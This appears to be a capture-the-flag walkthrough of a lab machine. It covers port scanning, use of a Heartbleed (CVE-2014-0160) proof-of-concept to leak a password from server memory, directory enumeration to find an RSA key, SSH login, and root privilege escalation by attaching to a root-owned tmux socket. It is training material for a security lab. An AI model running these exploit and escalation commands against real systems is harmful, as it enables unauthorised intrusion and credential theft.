<img width="703" height="644" alt="image" src="https://github.com/user-attachments/assets/a1da278b-55fb-451c-873a-da050b9ef119" />

> How many TCP ports are open on the remote host?
> 

### Command Used:

bash

`nmap -sS -p- 10.129.91.223`

![image.png](attachment:7878f583-2010-429f-82e2-5ba7a0840b63:image.png)

answer is `3`

> Which flag is used with nmap to execute its vulnerability discovery scripts (with the category "vuln") on the target?
> 

### Answer: `-script vuln`

### 🔧 Command Used:

bash

`nmap --script vuln -p 443 10.129.91.223`

![image.png](attachment:d7f24d31-3af8-4490-8ec3-5edb5d55542d:image.png)

### 📖 Explanation:

- Runs all scripts in the `vuln` category
- Helps identify CVEs and misconfigurations

> What is the 2014 CVE ID for an information disclosure vulnerability that the service on port 443 is vulnerable to?
> 

![image.png](attachment:d7e575cb-0847-4ba0-b8af-6997d7796a92:image.png)

`CVE-2014-0160` is the answer 

> What password can be leaked using HeartBleed (CVE-2014-0160)?
> 

step by step i use to get the password, first i use this tool for 

- Custom PoC script dumps memory
- We carved out the leaked password from the response

`git clone https://github.com/mpgn/heartbleed-PoC
cd heartbleed-PoC`

`python2 [heartbleed-exploit.py](http://heartbleed-exploit.py/) 10.129.91.223 443`

![image.png](attachment:d77ebf25-4baa-4956-9d86-2c1679392dd2:image.png)

![image.png](attachment:76121c37-6035-4e25-9502-4093731a8b9b:image.png)

then i read as strings and found the encryption of b64

![image.png](attachment:8945a4e0-ce63-4c81-8fe9-fb8a1cc711d1:image.png)

grab the encryption and decode it, we got the password

![image.png](attachment:4eada459-e1da-4986-8658-e7b6a379b8e6:image.png)

`heartbleedbelievethehype`

> What is the relative path of a folder on the website that contains two interesting files, including note.txt?
> 

I use gobuster tool to discover 

![image.png](attachment:4aa9eca1-c4df-4ce5-a454-a66d3cf37462:image.png)

Click the link and you will find the note.txt

![image.png](attachment:d25c831a-0985-495f-8af0-de7779bc46f3:image.png)

so the answer is 

```php
/dev/
```

> What is the filename of the RSA key found on the website?
> 

Click the hype_key file name

![image.png](attachment:ba30d923-03b0-4eb5-bf89-1d3ba5c56173:image.png)

`hype_key` is the answer 

> Submit the flag located in the hype user's home directory.
> 

### Force Legacy RSA Signature

Let’s explicitly tell your SSH client to use the legacy RSA signature algorithm. Create a temporary config file:

bash

`nano ssh_legacy_config`

Paste this:

Code

`Host 10.129.91.223
    HostName 10.129.91.223
    User hype
    IdentityFile ~/Desktop/tm/heartbleed-PoC/hype_key_decrypted.pem
    PubkeyAcceptedAlgorithms +ssh-rsa
    HostkeyAlgorithms +ssh-rsa`

Save and exit. Then connect using:

bash

`ssh -F ssh_legacy_config 10.129.91.223`

This forces your client to offer the older `ssh-rsa` algorithm, which OpenSSH 5.9 understands.

![image.png](attachment:febb78c2-268e-478a-bf10-6141363ce58e:image.png)

I use quite hard way hahah 

![image.png](attachment:92f26df7-50f0-4a99-88c8-e0c8a8489ad2:image.png)

then you find the flag

> Submit the flag located in root's home directory.
> 

This `ps aux` output shows all running processes on the system

![image.png](attachment:14e25847-7571-49a1-8c2f-b9e9227138c8:image.png)

![image.png](attachment:a99b6915-9e87-4710-97a8-5739277bae18:image.png)

That was the **root-owned tmux session** using a custom socket

hijacked it with:

bash

`tmux -S /.devs/dev_sess attach`

That gave you a **root shell**—a perfect example of privilege escalation via **session hijacking**.

![image.png](attachment:bc217917-ce1a-4971-aab9-42587c7b1172:image.png)

found the root flag!
